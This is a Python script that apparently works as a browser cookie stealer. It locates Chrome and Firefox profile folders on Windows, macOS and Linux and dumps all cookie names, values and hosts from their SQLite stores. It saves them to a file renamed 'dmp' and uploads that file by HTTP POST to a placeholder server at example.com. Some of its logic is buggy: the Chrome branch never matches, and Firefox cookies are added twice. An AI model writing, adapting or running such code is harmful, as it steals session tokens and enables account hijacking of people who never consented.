import os
import sqlite3
import json
import requests
import platform
import sys
import traceback

def get_chromium_cookies(browser_path):
    cookies_db_path = os.path.join(browser_path, 'User Data', 'Default', 'Network', 'Cookies')
    conn = sqlite3.connect(cookies_db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT name, value, host_key, path, is_secure, expires_utc, is_http_only, same_site FROM cookies")
    cookies = cursor.fetchall()
    conn.close()
    cookies_list = []
    for cookie in cookies:
        cookies_list.append({
            'name': cookie[0],
            'value': cookie[1],
            'host': cookie[2],
            'path': cookie[3],
            'secure': cookie[4],
            'expires_utc': cookie[5],
            'http_only': cookie[6],
            'same_site': cookie[7]
        })
    return cookies_list

def get_firefox_cookies(browser_path):
    cookies_file_path = os.path.join(browser_path, 'cookies.sqlite')
    conn = sqlite3.connect(cookies_file_path)
    cursor = conn.cursor()
    cursor.execute("SELECT name, value, host, path, isSecure, expiry, lastAccessed, isHttpOnly, inBrowserElement FROM moz_cookies")
    cookies = cursor.fetchall()
    conn.close()
    cookies_list = []
    for cookie in cookies:
        cookies_list.append({
            'name': cookie[0],
            'value': cookie[1],
            'host': cookie[2],
            'path': cookie[3],
            'secure': cookie[4],
            'expires_utc': cookie[5],
            'lastAccessed': cookie[6],
            'http_only': cookie[7],
            'inBrowserElement': cookie[8]
        })
    return cookies_list

def write_to_file(cookies, filename):
    with open(filename, 'w') as file:
        for cookie in cookies:
            file.write(json.dumps(cookie) + '\n')

def rename_file(old_name, new_name):
    os.rename(old_name, new_name)

def send_file_to_server(file_path, server_url):
    with open(file_path, 'rb') as file:
        files = {'file': file}
        response = requests.post(server_url, files=files)
        return response.status_code

def log_error(error_message):
    error_log_path = os.path.join(os.path.dirname(sys.executable), 'error_log.txt')
    with open(error_log_path, 'a') as error_log:
        error_log.write(error_message + '\n')

def find_browser_paths():
    system = platform.system()
    browser_paths = []

    if system == 'Windows':
        browser_paths.append(os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'))
        browser_paths.append(os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles'))
    elif system == 'Darwin':  # macOS
        browser_paths.append(os.path.expanduser('~/Library/Application Support/Google/Chrome'))
        browser_paths.append(os.path.expanduser('~/Library/Application Support/Firefox/Profiles'))
    elif system == 'Linux':
        browser_paths.append(os.path.expanduser('~/.config/google-chrome'))
        browser_paths.append(os.path.expanduser('~/.mozilla/firefox'))

    return browser_paths

def main():
    browser_paths = find_browser_paths()
    all_cookies = []

    for browser_path in browser_paths:
        try:
            if 'chromium' in browser_path.lower():
                cookies = get_chromium_cookies(browser_path)
            elif 'firefox' in browser_path.lower():
                for profile in os.listdir(browser_path):
                    profile_path = os.path.join(browser_path, profile)
                    if os.path.isdir(profile_path):
                        cookies = get_firefox_cookies(profile_path)
                        all_cookies.extend(cookies)
            else:
                continue

            all_cookies.extend(cookies)
        except Exception as e:
            log_error(f'Error retrieving cookies from {browser_path}: {e}')
            log_error(traceback.format_exc())

    if not all_cookies:
        log_error("No cookies found.")
        return

    output_directory = os.path.dirname(sys.executable)
    filename = os.path.join(output_directory, 'cookies.txt')
    try:
        write_to_file(all_cookies, filename)
    except Exception as e:
        log_error(f'Error writing to file: {e}')
        log_error(traceback.format_exc())
        return

    renamed_filename = os.path.join(output_directory, 'dmp')
    try:
        rename_file(filename, renamed_filename)
    except Exception as e:
        log_error(f'Error renaming file: {e}')
        log_error(traceback.format_exc())
        return

    server_url = 'http://example.com/upload'
    try:
        status_code = send_file_to_server(renamed_filename, server_url)
        print(f'File sent to server. Status code: {status_code}')
    except Exception as e:
        log_error(f'Error sending file to server: {e}')
        log_error(traceback.format_exc())

if __name__ == '__main__':
    main()